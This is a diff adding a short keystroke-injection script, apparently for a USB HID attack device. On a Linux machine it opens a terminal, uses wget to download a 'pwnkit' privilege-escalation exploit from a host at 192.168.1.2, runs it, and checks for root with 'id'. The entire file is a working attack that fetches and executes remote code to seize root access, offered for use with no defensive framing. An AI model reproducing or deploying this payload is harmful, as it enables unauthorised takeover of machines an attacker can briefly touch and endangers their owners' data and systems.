@@ -1,0 +1,52 @@
+REM simple script to execute any command as root on linux using the (pwnkit) poc
+REM ---------------------------------------------------------------------------
+
+
+DELAY 4000
+
+CTRL ALT T
+
+DELAY 200
+
+STRING cd /tmp
+
+DELAY 150
+
+ENTER
+
+DELAY 100
+
+STRING wget http://192.168.1.2:12/pwnkit
+
+DELAY 1000
+
+ENTER
+
+DELAY 1500
+
+STRING chmod +x pwnkit
+
+DELAY 150
+
+ENTER
+
+DELAY 100
+
+STRING ./pwnkit
+
+DELAY 150
+
+ENTER
+
+DELAY 200
+
+REM root access starts here 
+
+REM ----------------------------
+
+
+STRING id
+
+DELAY 50
+
+ENTER
